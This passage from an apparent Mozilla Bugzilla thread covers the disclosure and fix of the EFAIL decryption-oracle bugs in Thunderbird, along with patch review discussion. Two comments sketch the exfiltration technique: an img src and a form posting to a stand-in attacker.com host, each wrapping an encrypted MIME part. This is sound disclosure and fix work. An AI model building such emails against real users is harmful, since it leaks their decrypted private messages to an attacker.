| Issue A, PoC 3 | fixed? (dec only if top-level) |                              |
|----------------+--------------------------------+------------------------------|
| Issue B, PoC 1 | not vulnerable                 | fixed in Enigmail 1.9.9      |
| Issue B, PoC 2 | not vulnerable                 | fixed in Enigmail 1.9.9      |
+--------------------------------------------------------------------------------+

S/MIME, Issue A, PoC 1/3 -- Question to &#64;jcranmer:
--------------------------------------------------
Since when is it fixed? Just asking because TB 52.6 still allows partly S/MIME encrypted mails, it just does not allow partly S/MIME signed mails (therefore Issue B, PoC 1/2 is not vulnerable for S/MIME). Such a fix would mean that emails with e.g. only the attachment encrypted will no longer be decrypted, correct?

OpenPGP, Issue A, PoC 3 -- Possible workarounds:
--------------------------------------------------
- separate DOM for each HTML body part (best fix, but hardest to implement)
- same fix(?) as for S/MIME (drawback: partly encrypted mails will no longer be decrypted)
- do not give user an option to load remote content in encrypted mails (just a workaround!)

Last question: will a CVE be assigned to this with the fixing TB release?</pre><div class="activity"><div class="change">Flags: needinfo?(Pidgeot18)</div></div></div><div class="change-set" id="c18"><div class="comment" data-id="13228888" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a11166728_101158"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-24 01:27 PDT" data-time="1524558469">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-18" data-comment-id="13228888">Maybe we can close this bug.
It *looks* like this is being dealt with and discussed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED"
   href="/show_bug.cgi?id=1411592">bug 1411592</a>.</pre></div><div class="change-set" id="c19"><div class="comment" data-id="13229108" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a11166728_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-24 03:06 PDT" data-time="1524564364">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-19" data-comment-id="13229108">Unfortunately this bug has several parts, so many are fixed but not all. We still need to fix &quot;Decryption oracle PoC 1: Leaking plaintext through reply/forward&quot; AFAICT.</pre></div><div class="change-set" id="c20"><div class="comment" data-id="13229382" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a11166728_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-24 05:50 PDT" data-time="1524574259">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-20" data-comment-id="13229382"><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED"
   href="/show_bug.cgi?id=1411592">Bug 1411592</a> only fixed issues related to external content. The issue of message parts interacting is still open, see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED"
   href="/show_bug.cgi?id=1411592#c11">bug 1411592 comment #11</a> and above, and <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c11">comment #11</a> here. I haven't made any progress in <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - html attachment with CSS breaks email rendering"
   href="/show_bug.cgi?id=1297653">bug 1297653</a>.</pre></div><div class="change-set" id="c21"><div class="comment" data-id="13229748" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a11166728_101158"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-24 08:17 PDT" data-time="1524583026">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-21" data-comment-id="13229748">Note:

- Issue A, PoC 1 (leak plaintext via reply/forward) still works in
  TB-nightly for S/MIME encrypted messages (mitigated in Enigmail)

- Issue A, PoC 3 (leak plaintext via remote content) still works in
  TB-nightly for S/MIME encrypted messages (and for PGP too I guess)

This has *not* been fixed by <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED"
   href="/show_bug.cgi?id=1411592">bug 1411592</a>. The problem for Issue A, PoC 3 is that remote content *within* encrypted messages is disabled now (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED"
   href="/show_bug.cgi?id=1411592">bug 1411592</a>), but in *this* bug (&quot;direct exfiltration&quot;) we wrap the encrypted MIME part and prepend &lt;img src=&quot;<a rel="nofollow" href="http://attacker.com/">http://attacker.com/</a> in a previous MIME part in the same email -- where remote content still seems to be allowed. TB puts all together in a single HTML document to be rendered.

All those plaintext leaks (Issue A, Poc *) are based on the problem that multiple MIME parts are put into the same DOM. This can probably not be changed fast. But what about the following quick fix: Do not decrypt S/MIME and OpenPGP encrypted messages if they are not top-level (within in the MIME tree). This breaks partly encrypted messages but they should not happen often in practice (e.g. only-encrypt-the-attachment).</pre></div><div class="change-set" id="c22"><div class="comment" data-id="13231453" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_286107" id="a11166728_101158"><img src="https://secure.gravatar.com/avatar/454e57b6803023bd2c8c92abaff23861?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_286107" id="a11166728_101158"><a class="email " href="/user_profile?user_id=286107" > <span class="fna">Joshua Cranmer [:jcranmer]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-24 17:27 PDT" data-time="1524616073">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-22" data-comment-id="13231453">(In reply to Jens Müller from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c17">comment #17</a>)
<span class="quote">&gt; S/MIME, Issue A, PoC 1/3 -- Question to &#64;jcranmer:
&gt; --------------------------------------------------
&gt; Since when is it fixed? Just asking because TB 52.6 still allows partly
&gt; S/MIME encrypted mails, it just does not allow partly S/MIME signed mails
&gt; (therefore Issue B, PoC 1/2 is not vulnerable for S/MIME). Such a fix would
&gt; mean that emails with e.g. only the attachment encrypted will no longer be
&gt; decrypted, correct?</span >

We don't indicate that partly S/MIME mail is anything different from regular email. While the user could still see the decrypted email, there would be no indication that the email was encrypted in the first place unless the user desired to view source (or wondered why the message couldn't be found when searching message bodies).

<span class="quote">&gt; Last question: will a CVE be assigned to this with the fixing TB release?</span >

I play no role in that process.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(Pidgeot18)</span></div></div></div><div class="change-set" id="a13670866_101158"><div class="change" id="aa13670866_101158">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13670866_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_101158" id="a13670866_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a13670866_101158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a13670866_101158">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a13670866_101158">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-28 13:02 PDT" data-time="1524945757">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute"
   href="/show_bug.cgi?id=1457721">CVE-2018-5162</a></div></div></div><div class="change-set" id="a13834619_176914"><div class="change" id="aa13834619_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a13834619_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a13834619_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a13834619_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a13834619_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-30 10:31 PDT" data-time="1525109510">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8930486&amp;action=edit"
           title="Decryption oracle PoC 3: Leaking plaintext through src attribute"
           class=""
        >Attachment #8930486</a> -
        Attachment mime type: message/rfc822 &rarr; text/plain</div></div></div><div class="change-set" id="c23"><div class="comment" data-id="13260454" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-07 12:36 PDT" data-time="1525721774">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8973795"
         class="attachment patch obsolete"
         data-id="8973795" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="bug1419417_efail_reply_fwd.patch">
      <meta itemprop="contentSize" content="2340">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8973795">
          <a class="link" href="attachment.cgi?id=8973795&amp;action=diff">
        <span id="att-8973795-description" itemprop="description">bug1419417_efail_reply_fwd.patch</span></a> (obsolete)
        — <a href="attachment.cgi?id=8973795&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-23" data-comment-id="13260454">Fix PoC 1 by only forwarding/replying to encrypted messages as plaintext. 
That is not the neatest fix, but at least it's safe. 

This should be the last of the attack vectors.

We can try to think of a better fix but time is running up. 
What we could do is parse each part separately into a document, then insert each element after one another. But libmime is so much magic that it's really hard to follow where to put the logic.</pre><div class="activity"><div class="change">Assignee: Pidgeot18 &rarr; mkmelin+mozilla</div><div class="change">Status: UNCONFIRMED &rarr; ASSIGNED</div><div class="change">Ever confirmed: true</div><div class="change">
        <a href="/attachment.cgi?id=8973795&amp;action=edit"
           title="bug1419417_efail_reply_fwd.patch"
           class=""
        >Attachment #8973795</a> -
        Flags: review?(jorgk)</div></div></div><div class="change-set" id="c24"><div class="comment" data-id="13260581" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a13834619_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-07 13:21 PDT" data-time="1525724519">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-24" data-comment-id="13260581">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8973795" name="attach_8973795" title="bug1419417_efail_reply_fwd.patch">attachment 8973795</a> <a href="/attachment.cgi?id=8973795&amp;action=edit" title="bug1419417_efail_reply_fwd.patch">[details]</a> <a href="/attachment.cgi?id=8973795&amp;action=diff" title="bug1419417_efail_reply_fwd.patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8973795'>[review]</a>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417">bug1419417</a>_efail_reply_fwd.patch

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8973795" name="attach_8973795" title="bug1419417_efail_reply_fwd.patch">attachment 8973795</a> <a href="/attachment.cgi?id=8973795&amp;action=edit" title="bug1419417_efail_reply_fwd.patch">[details]</a> <a href="/attachment.cgi?id=8973795&amp;action=diff" title="bug1419417_efail_reply_fwd.patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8973795'>[review]</a>:
-----------------------------------------------------------------

::: mailnews/compose/src/nsMsgCompose.cpp
&#64;&#64; +1031,5 &#64;&#64;
<span class="quote">&gt;  
&gt;    rv = composeService-&gt;DetermineComposeHTML(m_identity, format, &amp;m_composeHTML);
&gt;    NS_ENSURE_SUCCESS(rv,rv);
&gt;  
&gt; +  // Make sure we only do plaintext encrypted replies/forwards.</span >

That comment isn't clear. Are you saying that when replying to an encrypted HTLM message or forwarding it, we'll convert the reply or forwarded message to plaintext?

That's what the code appears to do. If the original was encrypted, the new message (reply/forwarded) will be converted to plaintext.

I can't see that this will be very popular. People might want to work around that with using &quot;Edit as new&quot;. What happens in that case?</pre></div><div class="change-set" id="c25"><div class="comment" data-id="13261468" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a13834619_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-07 22:16 PDT" data-time="1525756618">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-25" data-comment-id="13261468">(In reply to Magnus Melin from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c23">comment #23</a>)
<span class="quote">&gt; Created <span class="bz_obsolete"><a href="/attachment.cgi?id=8973795" name="attach_8973795" title="bug1419417_efail_reply_fwd.patch">attachment 8973795</a> <a href="/attachment.cgi?id=8973795&amp;action=edit" title="bug1419417_efail_reply_fwd.patch">[details]</a> <a href="/attachment.cgi?id=8973795&amp;action=diff" title="bug1419417_efail_reply_fwd.patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8973795'>[review]</a>
&gt; <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417">bug1419417</a>_efail_reply_fwd.patch
&gt; 
&gt; Fix PoC 1 by only forwarding/replying to encrypted messages as plaintext. 
&gt; That is not the neatest fix, but at least it's safe. </span >

I think this is a no-go for many users who use encrypted messages. Here is what I did in Enigmail: I (re-)parse the message to get the message structure (and then interpret the structure. If an unencrypted MIME part as a PGP/MIME encrypted sibling (i.e. MIME parts on the same level), then I display a warning to the user saying that the message may lead to revealing sensitive information. I would also agree that in this case conversion to plain text is a valid option.

See: <a rel="nofollow" href="https://gitlab.com/enigmail/enigmail/blob/master/ui/content/enigmailMsgComposeOverlay.js#L562">https://gitlab.com/enigmail/enigmail/blob/master/ui/content/enigmailMsgComposeOverlay.js#L562</a></pre></div><div class="change-set" id="c26"><div class="comment" data-id="13261634" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-08 00:37 PDT" data-time="1525765078">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-26" data-comment-id="13261634">Hmm, but mixing of encrypted and non-encrypted is not really needed for this PoC is it?</pre></div><div class="change-set" id="c27"><div class="comment" data-id="13261637" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a13834619_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-08 00:39 PDT" data-time="1525765191">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-27" data-comment-id="13261637">(In reply to Jorg K (GMT+1) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c24">comment #24</a>)
<span class="quote">&gt; That comment isn't clear. Are you saying that when replying to an encrypted
&gt; HTLM message or forwarding it, we'll convert the reply or forwarded message
&gt; to plaintext?</span >

That's what it does yes.</pre></div><div class="change-set" id="c28"><div class="comment" data-id="13262781" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_100230" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/da0befc896cd73c16805f598f0e18bcb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_100230" id="a13834619_176914"><a class="email " href="/user_profile?user_id=100230" > <span class="fna">Patrick Brunschwig</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-08 08:44 PDT" data-time="1525794282">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-28" data-comment-id="13262781">(In reply to Magnus Melin from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c26">comment #26</a>)
<span class="quote">&gt; Hmm, but mixing of encrypted and non-encrypted is not really needed for this
&gt; PoC is it?</span >

Yes, I think you a have to have a mixture. You have an apparently unencrypted HTML message that contains a hidden encrypted MIME part. The only way to achieve this is by a structure like below, which implies that a multipart/encrypted message is on the same level or below an unencrypted message part:

multipart/mixed 1.1
   |--- Content-Type: text/html 1.1.1
   |    &lt;form action=&quot;<a rel="nofollow" href="https://attacker.com/leak">https://attacker.com/leak</a>&quot; method=&quot;post&quot;&gt;
   |    &lt;button type=&quot;submit&quot;&gt;
   |    &lt;textarea
   |--- Content-Type: multipart/encrypted 1.1.2
   

Whether or not 1.1 is a sub-part of an encrypted message does not matter. Once you have the decrypted MIME tree, you need to have a mixture of non-encrypted and encrypted MIME parts. Otherwise the trick of hiding an encrypted message in an unencrypted message cannot work.</pre></div><div class="change-set" id="c29"><div class="comment" data-id="13263741" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a13834619_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a13834619_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-08 14:22 PDT" data-time="1525814522">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
